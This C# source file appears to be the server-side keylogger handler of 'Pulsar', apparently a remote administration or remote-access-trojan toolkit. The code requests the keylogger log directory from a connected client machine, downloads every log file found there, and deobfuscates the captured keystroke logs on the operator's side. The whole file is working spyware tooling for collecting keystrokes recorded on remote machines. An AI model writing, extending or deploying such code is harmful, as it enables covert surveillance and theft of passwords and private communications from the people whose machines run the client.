using Pulsar.Common.Helpers;
using Pulsar.Common.Messages;
using Pulsar.Common.Messages.Administration.FileManager;
using Pulsar.Common.Messages.Monitoring.KeyLogger;
using Pulsar.Common.Messages.Other;
using Pulsar.Common.Models;
using Pulsar.Common.Networking;
using Pulsar.Server.Models;
using Pulsar.Server.Networking;
using System;
using System.IO;
using System.Linq;

namespace Pulsar.Server.Messages
{
    /// <summary>
    /// Handles messages for the interaction with the remote keylogger.
    /// </summary>
    public class KeyloggerHandler : MessageProcessorBase<string>, IDisposable
    {
        /// <summary>
        /// The client which is associated with this keylogger handler.
        /// </summary>
        private readonly Client _client;

        /// <summary>
        /// The file manager handler used to retrieve keylogger logs from the client.
        /// </summary>
        private readonly FileManagerHandler _fileManagerHandler;

        /// <summary>
        /// The remote path of the keylogger logs directory.
        /// </summary>
        private string _remoteKeyloggerDirectory;

        /// <summary>
        /// The amount of all running log transfers.
        /// </summary>
        private int _allTransfers;

        /// <summary>
        /// The amount of all completed log transfers.
        /// </summary>
        private int _completedTransfers;

        /// <summary>
        /// The amount of failed transfers.
        /// </summary>
        private int _failedTransfers;

        /// <summary>
        /// Tracks whether this handler has been disposed.
        /// </summary>
        private bool _isDisposed;

        /// <summary>
        /// Lock object for thread-safe counter updates.
        /// </summary>
        private readonly object _transferLock = new object();

        /// <summary>
        /// Initializes a new instance of the <see cref="KeyloggerHandler"/> class using the given client.
        /// </summary>
        /// <param name="client">The associated client.</param>
        public KeyloggerHandler(Client client) : base(true)
        {
            _client = client;
            _fileManagerHandler = new FileManagerHandler(client, "Logs\\");
            _fileManagerHandler.DirectoryChanged += DirectoryChanged;
            _fileManagerHandler.FileTransferUpdated += FileTransferUpdated;
            _fileManagerHandler.ProgressChanged += StatusUpdated;
            MessageHandler.Register(_fileManagerHandler);
        }

        /// <inheritdoc />
        public override bool CanExecute(IMessage message) => message is GetKeyloggerLogsDirectoryResponse;

        /// <inheritdoc />
        public override bool CanExecuteFrom(ISender sender) => _client.Equals(sender);

        /// <inheritdoc />
        public override void Execute(ISender sender, IMessage message)
        {
            switch (message)
            {
                case GetKeyloggerLogsDirectoryResponse logsDirectory:
                    Execute(sender, logsDirectory);
                    break;
            }
        }

        /// <summary>
        /// Retrieves the keylogger logs and begins downloading them.
        /// </summary>
        public void RetrieveLogs()
        {
            if (_isDisposed)
                throw new ObjectDisposedException(nameof(KeyloggerHandler));

            try
            {
                lock (_transferLock)
                {
                    _allTransfers = 0;
                    _completedTransfers = 0;
                    _failedTransfers = 0;
                }

                _client.Send(new GetKeyloggerLogsDirectory());
            }
            catch (Exception ex)
            {
                OnReport($"Failed to retrieve logs: {ex.Message}");
            }
        }

        private void Execute(ISender client, GetKeyloggerLogsDirectoryResponse message)
        {
            try
            {
                _remoteKeyloggerDirectory = message.LogsDirectory;

                if (string.IsNullOrWhiteSpace(_remoteKeyloggerDirectory))
                {
                    OnReport("Invalid logs directory path");
                    return;
                }

                client.Send(new GetDirectory { RemotePath = _remoteKeyloggerDirectory });
            }
            catch (Exception ex)
            {
                OnReport($"Error accessing logs directory: {ex.Message}");
            }
        }

        private string GetDownloadProgress(int allTransfers, int completedTransfers, int failedTransfers = 0)
        {
            if (allTransfers == 0)
                return "Downloading...";

            decimal progress = Math.Round((decimal)((double)(completedTransfers + failedTransfers) / (double)allTransfers * 100.0), 2);

            if (failedTransfers > 0)
            {
                return $"Downloading...({progress}%) - {failedTransfers} failed";
            }

            return $"Downloading...({progress}%)";
        }

        private void StatusUpdated(object sender, string value)
        {
            // called when directory does not exist or access is denied
            OnReport($"No logs found ({value})");
        }

        private void DirectoryChanged(object sender, string remotePath, FileSystemEntry[] items)
        {
            try
            {
                if (items == null || items.Length == 0)
                {
                    OnReport("No logs found");
                    return;
                }

                var logFiles = items.Where(item =>
                    !string.IsNullOrWhiteSpace(item.Name) &&
                    !item.Name.EndsWith(".queue", StringComparison.OrdinalIgnoreCase) &&
                    !FileHelper.HasIllegalCharacters(item.Name)
                ).ToArray();

                if (logFiles.Length == 0)
                {
                    OnReport("No valid log files found");
                    return;
                }

                lock (_transferLock)
                {
                    _allTransfers = logFiles.Length;
                    _completedTransfers = 0;
                    _failedTransfers = 0;
                }

                OnReport(GetDownloadProgress(_allTransfers, _completedTransfers));

                foreach (var item in logFiles)
                {
                    try
                    {
                        if (item.Name.Length > 255)
                        {
                            System.Diagnostics.Debug.WriteLine($"Skipping file with name too long: {item.Name}");
                            lock (_transferLock)
                            {
                                _failedTransfers++;
                            }
                            continue;
                        }

                        string logRemotePath = Path.Combine(_remoteKeyloggerDirectory, item.Name);
                        string localFileName = item.Name + ".txt";

                        _fileManagerHandler.BeginDownloadFile(logRemotePath, localFileName, true);
                    }
                    catch (Exception ex)
                    {
                        System.Diagnostics.Debug.WriteLine($"Error initiating download for {item.Name}: {ex.Message}");
                        lock (_transferLock)
                        {
                            _failedTransfers++;
                        }
                    }
                }

                int skippedFiles = items.Length - logFiles.Length;
                if (skippedFiles > 0)
                {
                    System.Diagnostics.Debug.WriteLine($"Skipped {skippedFiles} invalid/queue files");

                    if (logFiles.Length == 0 && items.Any(i => FileHelper.HasIllegalCharacters(i.Name)))
                    {
                        _client.Disconnect();
                        OnReport("Disconnected: Malicious files detected");
                        return;
                    }
                }
            }
            catch (Exception ex)
            {
                OnReport($"Error processing directory listing: {ex.Message}");
            }
        }

        private void FileTransferUpdated(object sender, FileTransfer transfer)
        {
            if (transfer == null)
                return;

            try
            {
                if (transfer.Status == "Completed")
                {
                    bool success = false;

                    try
                    {
                        if (string.IsNullOrWhiteSpace(transfer.LocalPath) || !File.Exists(transfer.LocalPath))
                        {
                            throw new FileNotFoundException($"Transfer completed but file not found: {transfer.LocalPath}");
                        }

                        string deobfuscatedContent = FileHelper.ReadObfuscatedLogFile(transfer.LocalPath);

                        if (string.IsNullOrEmpty(deobfuscatedContent))
                        {
                            System.Diagnostics.Debug.WriteLine($"Warning: Deobfuscated log file is empty: {transfer.LocalPath}");
                        }

                        File.WriteAllText(transfer.LocalPath, deobfuscatedContent);

                        success = true;
                    }
                    catch (Exception ex)
                    {
                        System.Diagnostics.Debug.WriteLine($"Failed to deobfuscate {transfer.LocalPath}: {ex.Message}");

                        try
                        {
                            string errorPath = transfer.LocalPath + ".error";
                            if (File.Exists(transfer.LocalPath))
                            {
                                File.Move(transfer.LocalPath, errorPath);
                                System.Diagnostics.Debug.WriteLine($"Moved failed file to: {errorPath}");
                            }
                        }
                        catch
                        {
                            // ignore
                        }
                    }

                    lock (_transferLock)
                    {
                        if (success)
                        {
                            _completedTransfers++;
                        }
                        else
                        {
                            _failedTransfers++;
                        }

                        int totalProcessed = _completedTransfers + _failedTransfers;

                        if (totalProcessed >= _allTransfers)
                        {
                            if (_failedTransfers > 0)
                            {
                                OnReport($"Retrieved {_completedTransfers} of {_allTransfers} logs ({_failedTransfers} failed)");
                            }
                            else
                            {
                                OnReport("Successfully retrieved all logs");
                            }
                        }
                        else
                        {
                            OnReport(GetDownloadProgress(_allTransfers, _completedTransfers, _failedTransfers));
                        }
                    }
                }
                else if (transfer.Status == "Error" || transfer.Status == "Failed")
                {
                    lock (_transferLock)
                    {
                        _failedTransfers++;

                        int totalProcessed = _completedTransfers + _failedTransfers;

                        if (totalProcessed >= _allTransfers)
                        {
                            OnReport($"Retrieved {_completedTransfers} of {_allTransfers} logs ({_failedTransfers} failed)");
                        }
                        else
                        {
                            OnReport(GetDownloadProgress(_allTransfers, _completedTransfers, _failedTransfers));
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                System.Diagnostics.Debug.WriteLine($"Error in FileTransferUpdated: {ex.Message}");
                OnReport($"Error processing transfer: {ex.Message}");
            }
        }

        /// <summary>
        /// Disposes all managed and unmanaged resources associated with this message processor.
        /// </summary>
        public void Dispose()
        {
            Dispose(true);
            GC.SuppressFinalize(this);
        }

        protected virtual void Dispose(bool disposing)
        {
            if (_isDisposed)
                return;

            if (disposing)
            {
                try
                {
                    MessageHandler.Unregister(_fileManagerHandler);
                    _fileManagerHandler.ProgressChanged -= StatusUpdated;
                    _fileManagerHandler.FileTransferUpdated -= FileTransferUpdated;
                    _fileManagerHandler.DirectoryChanged -= DirectoryChanged;
                    _fileManagerHandler.Dispose();
                }
                catch (Exception ex)
                {
                    System.Diagnostics.Debug.WriteLine($"Error during KeyloggerHandler disposal: {ex.Message}");
                }
            }

            _isDisposed = true;
        }
    }
}